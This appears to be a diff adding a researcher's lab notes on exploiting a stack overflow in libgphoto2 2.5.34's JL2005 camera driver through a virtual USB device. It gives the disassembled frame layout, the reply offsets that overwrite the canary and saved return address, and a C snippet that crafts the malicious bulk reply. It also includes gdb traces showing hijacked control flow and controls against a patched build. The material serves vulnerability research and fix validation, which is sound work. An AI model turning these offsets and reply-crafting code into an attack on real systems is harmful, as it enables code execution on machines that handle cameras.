@@ -1,0 +1,94 @@
+# W167 (2026-11-23): chosen control-flow target executes in the real
+# plain (no-ASan) libgphoto2 2.5.34 build when the virtual JL2005 device
+# supplies the correct per-process canary in its bulk reply.
+#
+# All runs: src/libgphoto2-2.5.34-plain, CFLAGS
+# '-O0 -g -fPIC -fno-omit-frame-pointer', distro default stack protector,
+# committed vusb patch plus LOCAL-ONLY mode 'c' (below), driver
+# live/two_stage_probe (local, untracked). No network, no real USB device.
+# Env for every run:
+#   P=$PWD/lab/frontier/libgphoto2shell/src/libgphoto2-2.5.34-plain/installdir-plain
+#   CAMLIBS=$P/lib/libgphoto2/2.5.34
+#   IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb
+#   LD_LIBRARY_PATH=$P/lib
+#   M2SHELL_JL2005_VUSB=c M2SHELL_JL2005_COUNT=1022
+#   port usb:001,001
+#
+# The driver reads its own stack canary from %fs:0x28 and sets
+# M2SHELL_JL2005_CANARY to that value, and M2SHELL_JL2005_RIP to the address
+# of its local noinline marker(), which writes M2SHELL_IP_CONTROL_MARKER
+# to stdout and _exit(0)s. The local vusb mode 'c' writes those two 8-byte
+# values little-endian into the 0x4000-byte bulk reply at offsets 0x3E28
+# (info+0x4028 = rbp-8, canary) and 0x3E38 (info+0x4038 = rbp+8, saved RIP).
+# Committed pins, committed vusb patch and harness are UNCHANGED.
+
+## Frame layout, real jl2005c.so disassembly at jl2005c_init+58
+64 48 8b 04 25 28 00 00 00    mov    %fs:0x28,%rax
+48 89 45 f8                   mov    %rax,-0x8(%rbp)
+48 8d 85 d0 bf ff ff          lea    -0x4030(%rbp),%rax    # info
+# info = rbp-0x4030; read at pinned :152 writes info+0x200 .. info+0x4200
+# = rbp-0x3E30 .. rbp+0x1D0, covering canary (rbp-8) and saved RIP (rbp+8).
+
+## Vulnerable build, correct canary, chosen marker RIP
+$ M2SHELL_JL2005_VUSB=c M2SHELL_JL2005_COUNT=1022 ./two_stage_probe usb:001,001
+canary=0xb27ae049353f1d00 marker=0x00006497beab43c4
+M2SHELL_IP_CONTROL_MARKER
+RC=0
+
+## gdb trace: canary and saved RIP at pinned :154, then entry to marker
+Breakpoint 1, jl2005c_init (...) at jl2005c/jl2005c.c:47
+ENTRY rbp=0x7fffffffc9b0 canary=0x55555555fde0
+Breakpoint 2, jl2005c_init (...) at jl2005c/jl2005c.c:154
+154             memmove(priv->table, info + 0x30, alloc_table_size - 0x30);
+AT154 rbp=0x7fffffffc9b0 canary=0x84d0d965013e3700 savedrip=0x5555555553c4
+Breakpoint 3, marker () at live/two_stage_probe.c:21
+#0  marker () at live/two_stage_probe.c:21
+#1  0x5a5a5a5a5a5a5a5a in ?? ()
+#2  0x5a5a5a5a5a5a5a5a in ?? ()
+#3  0x5a5a5a5a5a5a5a5a in ?? ()
+rip            0x5555555553d0      0x5555555553d0 <marker+12>
+rbp            0x7fffffffc9b8      0x7fffffffc9b8
+# The canary at AT154 is the value the driver fed to the device; the saved
+# RIP equals the reported &marker. The backtrace above marker is 0x5a...
+# because the same write clobbers caller frames; marker _exit(0)s before
+# any unwind reaches them.
+
+## Controls (same build)
+count=100, mode c:        gp_camera_init rc=0, no marker (no overflow).
+wrong canary (deadbeef):  *** stack smashing detected ***, RC=134, no marker.
+correct canary, RIP=0x5a: RC=139 (SIGSEGV), no marker.
+mode 1 (all 0x5a bytes):  *** stack smashing detected ***, RC=134, no marker.
+
+## Fixed-source control (pins/fix-6a3393d.patch applied to the local plain
+## tree, `make -C camlibs`, copy camlibs/.libs/jl2005c.so into installdir,
+## then reversed and rebuilt):
+$ M2SHELL_JL2005_VUSB=c M2SHELL_JL2005_COUNT=1022 ./two_stage_probe usb:001,001
+canary=0x1d80a2e7b8c6fc00 marker=0x00005d52776bd3c4
+gp_camera_init rc=0
+RC=0                                      # no marker
+gdb: jl2005c_init returns -102 (GP_ERROR_CORRUPTED_DATA);
+     camera_init (library.c:489) still returns GP_OK to gp_camera_init.
+After reversing the patch and rebuilding, the vulnerable build again
+printed M2SHELL_IP_CONTROL_MARKER with RC=0.
+
+## Local-only vusb mode 'c', added AFTER the committed patch's reply block
+if (m2[0] == 'c' && n >= 0x3E40) {
+        const char *ks = getenv("M2SHELL_JL2005_CANARY");
+        const char *rs = getenv("M2SHELL_JL2005_RIP");
+        if (ks) { unsigned long long v = strtoull(ks, NULL, 0);
+                  for (i = 0; i < 8; i++)
+                          bytes[0x3E28+i] = (char)((v >> (8*i)) & 0xff); }
+        if (rs) { unsigned long long v = strtoull(rs, NULL, 0);
+                  for (i = 0; i < 8; i++)
+                          bytes[0x3E38+i] = (char)((v >> (8*i)) & 0xff); }
+}
+
+## Limits
+The canary is supplied by the driver from the process's own TLS: this
+demonstrates that the stack protector is not a structural barrier once the
+canary is known, and W166 observed the same canary copied into the heap by
+a short reply. It does NOT demonstrate a device-only canary-recovery path
+to the reply: the heap copy's consumer still aborts on the corrupted top
+chunk. No wire/USB transport, remote request, camera consumer, socket,
+witness replay or benign command side effect. Rung 4 control-flow target
+execution is local and unwitnessed; rung 5 stays UNKNOWN.
